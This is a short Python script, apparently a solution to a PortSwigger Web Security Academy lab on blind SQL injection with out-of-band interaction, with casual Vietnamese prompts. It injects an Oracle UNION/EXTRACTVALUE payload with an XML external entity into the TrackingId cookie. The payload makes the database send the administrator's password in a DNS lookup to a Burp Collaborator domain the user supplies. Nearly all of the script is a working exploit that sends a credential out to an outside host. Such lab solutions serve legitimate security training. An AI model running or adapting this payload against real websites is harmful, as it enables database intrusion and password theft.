#Lab: Blind SQL injection with out-of-band interaction
import requests

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")

collab_domain = input("Nhập domain Burp Collaborator (gaysex.burpcollaborator.net): ").strip()

session = requests.Session()
res = session.get(base_url)

tracking_id = res.cookies.get("TrackingId")
session_id = res.cookies.get("session")

payload = f"'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.{collab_domain}/\">+%25remote%3b]>'),'/l')+FROM+dual--"

cookies = {
    "TrackingId": payload,
    "session": session_id
}

print("[!] Gửi payload với DNS lookup... Kiểm tra Burp Collaborator log!")

response = session.get(base_url, cookies=cookies)

if response.status_code == 200:
    print("[+] Ngon! Nếu thấy request trong Burp Collaborator => Ngon pro max!")
else:
    print("[-] Thua")
